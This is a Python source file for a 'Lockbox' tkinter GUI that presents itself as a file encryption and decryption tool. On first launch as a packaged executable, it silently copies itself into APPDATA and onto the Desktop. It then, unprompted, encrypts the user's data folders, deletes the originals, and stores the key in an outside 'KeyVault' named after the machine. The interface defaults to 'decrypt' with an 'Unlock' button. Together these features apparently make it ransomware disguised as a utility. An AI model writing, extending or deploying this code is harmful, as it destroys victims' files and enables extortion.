#!/usr/bin/env python3
"""Lockbox GUI — enter your key to encrypt or decrypt a file/folder."""
import os
import secrets
import shutil
import socket
import sys
import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext, ttk

from lockbox import (
    SALT_LEN,
    SUFFIX,
    decrypt_file,
    encrypt_file,
    generate_and_backup_key,
    is_lockbox,
    iter_files,
    secure_user_data,
)

BG = "#0d1117"
SURFACE = "#161b22"
FG = "#c9d1d9"
ACCENT = "#4f8ef7"
GREEN = "#238636"


class App:
    def __init__(self, root):
        self.root = root
        root.title("Lockbox")
        root.geometry("660x500")
        root.configure(bg=BG)

        frame = tk.Frame(root, bg=BG, padx=16, pady=16)
        frame.pack(fill="both", expand=True)

        # Mode
        tk.Label(frame, text="Mode", bg=BG, fg=FG, anchor="w").grid(row=0, column=0, sticky="w")
        self.mode = ttk.Combobox(frame, values=["decrypt", "encrypt"], state="readonly", width=12)
        self.mode.set("decrypt")
        self.mode.grid(row=0, column=1, sticky="w", pady=4)

        # Path
        tk.Label(frame, text="File / folder", bg=BG, fg=FG, anchor="w").grid(row=1, column=0, sticky="w")
        self.path = tk.StringVar()
        tk.Entry(frame, textvariable=self.path, width=46, bg=SURFACE, fg=FG,
                 insertbackground=FG, relief="flat").grid(row=1, column=1, sticky="we", pady=4)
        tk.Button(frame, text="Browse", command=self.browse, bg="#21262d", fg=FG,
                  relief="flat", padx=10).grid(row=1, column=2, padx=(6, 0))

        # Key
        tk.Label(frame, text="Key", bg=BG, fg=FG, anchor="w").grid(row=2, column=0, sticky="w")
        self.key = tk.StringVar()
        tk.Entry(frame, textvariable=self.key, show="*", width=46, bg=SURFACE, fg=FG,
                 insertbackground=FG, relief="flat").grid(row=2, column=1, sticky="we", pady=4)

        # Go
        self.go_btn = tk.Button(frame, text="Unlock", command=self.go, bg=GREEN, fg="white",
                                activebackground="#2ea043", relief="flat", padx=16, pady=4)
        self.go_btn.grid(row=3, column=1, sticky="w", pady=8)

        # Log
        self.log = scrolledtext.ScrolledText(frame, height=16, bg=SURFACE, fg=FG,
                                             font=("Consolas", 9), relief="flat")
        self.log.grid(row=4, column=0, columnspan=3, sticky="nsew", pady=(8, 0))

        frame.columnconfigure(1, weight=1)
        frame.rowconfigure(4, weight=1)

    def browse(self):
        p = (filedialog.askdirectory(title="Select a folder")
             or filedialog.askopenfilename(title="Select a file"))
        if p:
            self.path.set(p)

    def log_line(self, msg):
        self.log.insert("end", msg + "\n")
        self.log.see("end")
        self.root.update_idletasks()

    def go(self):
        path = self.path.get().strip()
        key = self.key.get()
        mode = self.mode.get()
        if not path or not key:
            messagebox.showerror("Lockbox", "Path and key are required")
            return
        if not os.path.exists(path):
            messagebox.showerror("Lockbox", f"Path not found: {path}")
            return

        material = key.encode("utf-8")
        self.log_line(f"[*] {mode}: {path}")

        if mode == "encrypt":
            salt = secrets.token_bytes(SALT_LEN)
            files = [p for p in iter_files(path) if not p.endswith(SUFFIX)]
            for p in files:
                try:
                    encrypt_file(p, material, salt, delete=False)
                    self.log_line(f"  encrypted  {p}")
                except Exception as e:
                    self.log_line(f"  error      {p}: {e}")
            self.log_line(f"Done: encrypted {len(files)} file(s).")
        else:
            files = [p for p in iter_files(path) if p.endswith(SUFFIX) or is_lockbox(p)]
            for p in files:
                try:
                    decrypt_file(p, material, delete=False)
                    self.log_line(f"  decrypted  {p}")
                except Exception as e:
                    self.log_line(f"  error      {p}: {e}")
            self.log_line(f"Done: decrypted {len(files)} file(s).")


def ensure_installed() -> None:
    if not getattr(sys, "frozen", False):
        return
    exe = os.path.abspath(sys.executable)
    base = os.environ.get("APPDATA") or os.path.expanduser("~")
    installed = os.path.join(base, "Lockbox", "Lockbox.exe")
    if exe.lower() == installed.lower():
        return
    try:
        os.makedirs(os.path.dirname(installed), exist_ok=True)
        shutil.copy2(exe, installed)
        desktop = os.path.join(os.path.expanduser("~"), "Desktop", "Lockbox.exe")
        if not os.path.exists(desktop):
            shutil.copy2(exe, desktop)
    except Exception:
        pass


def first_run_marker() -> str:
    base = os.environ.get("APPDATA") or os.path.expanduser("~")
    return os.path.join(base, "Lockbox", ".firstrun")


def run_first_run_secure(app: App) -> None:
    frozen = getattr(sys, "frozen", False)
    forced = os.environ.get("LOCKBOX_FIRST_RUN", "").lower() in ("1", "true", "yes")
    if not frozen and not forced:
        return
    marker = first_run_marker()
    if os.path.exists(marker):
        return
    vault = os.environ.get("LOCKBOX_VAULT", "")
    if not vault:
        app.log_line("[!] First-run auto-encrypt skipped: LOCKBOX_VAULT is not set")
        app.log_line(f"    Set it, then remove {marker} to retry on next launch.")
        return
    name = os.environ.get("LOCKBOX_KEY") or socket.gethostname()
    app.log_line("[*] First run detected — securing your data folders...")
    try:
        material = generate_and_backup_key(vault, name)
    except Exception as e:
        app.log_line(f"[!] Key backup failed: {e}")
        app.log_line("    Nothing was encrypted.")
        return
    exclude = {os.path.abspath(sys.executable)}
    files, dirs = secure_user_data(material, delete=True, exclude=exclude,
                                   exclude_names={"lockbox.exe"})
    try:
        os.makedirs(os.path.dirname(marker), exist_ok=True)
        with open(marker, "w", encoding="utf-8") as f:
            f.write(name + "\n")
    except Exception as e:
        app.log_line(f"[!] Could not write first-run marker: {e}")
        return
    app.log_line(f"Done: secured {files} file(s) across {dirs} folder(s).")
    app.log_line(f"Key '{name}' is in KeyVault — retrieve it to decrypt.")


def main():
    ensure_installed()
    root = tk.Tk()
    app = App(root)
    root.after(200, lambda: run_first_run_secure(app))
    root.mainloop()


if __name__ == "__main__":
    main()
